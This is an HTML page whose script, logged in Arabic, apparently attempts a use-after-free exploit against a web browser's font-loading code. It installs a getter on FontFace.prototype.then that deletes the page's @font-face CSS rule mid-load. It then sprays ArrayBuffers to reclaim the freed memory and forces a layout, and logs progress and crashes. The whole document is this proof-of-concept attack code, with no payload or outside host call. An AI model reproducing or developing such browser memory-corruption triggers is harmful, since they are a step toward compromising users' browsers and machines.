<!DOCTYPE html>
<html>
<head>
    <style id="s">
        @font-face { font-family: 'myFont'; src: url(nonexistent.woff); unicode-range: U+0042; }
    </style>
</head>
<body style="margin:0; padding:20px; font-family:monospace; background:black; color:white;">
    <div id="log" style="position:fixed; top:0; left:0; width:100%; height:100%; padding:20px; overflow:auto; white-space:pre-wrap;"></div>

    <script>
        // 1. دالة تسجيل الأحداث
        function log(m, color) {
            let el = document.createElement('div');
            el.innerHTML = "[LOG]: " + m;
            document.getElementById('log').appendChild(el);
            if (color) document.body.style.background = color;
        }

        window.onerror = function(msg, url, line) {
            log("CRASH DETECTED: " + msg + " at line " + line, "#800");
        };

        log("1. بدء العمليات...", "green");

        try {
            // 2. إعداد الـ Hook قبل أي شيء آخر
            log("2. إعداد الـ Hook...", "yellow");
            
            Object.defineProperty(FontFace.prototype, 'then', {
                configurable: true,
                get() {
                    log("!!! تم الوصول للـ Getter (الخطة نجحت) !!!", "orange");
                    
                    try {
                        document.getElementById('s').sheet.deleteRule(0);
                        log("تم حذف القاعدة (Rule Deleted)", "orange");

                        let spray = [];
                        for (let i = 0; i < 100; i++) {
                            spray.push(new ArrayBuffer(0x1000));
                        }
                        log("تم الـ Spray", "purple");
                        document.body.offsetTop;
                    } catch(err) {
                        log("ERROR IN HOOK: " + err.message, "red");
                    }
                    return undefined;
                }
            });

            // 3. Trigger
            log("3. جاري تحميل الخط (Font Load)...", "yellow");
            let A = new FontFace('myFont', 'local(Helvetica)', { unicodeRange: 'U+0041' });
            document.fonts.add(A);
            document.fonts.load('1em myFont', 'AB');
            
            log("4. تم طلب التحميل (انتظر النتائج)...", "yellow");

        } catch(e) {
            log("ERROR: " + e.message, "red");
        }
    </script>
</body>
</html>
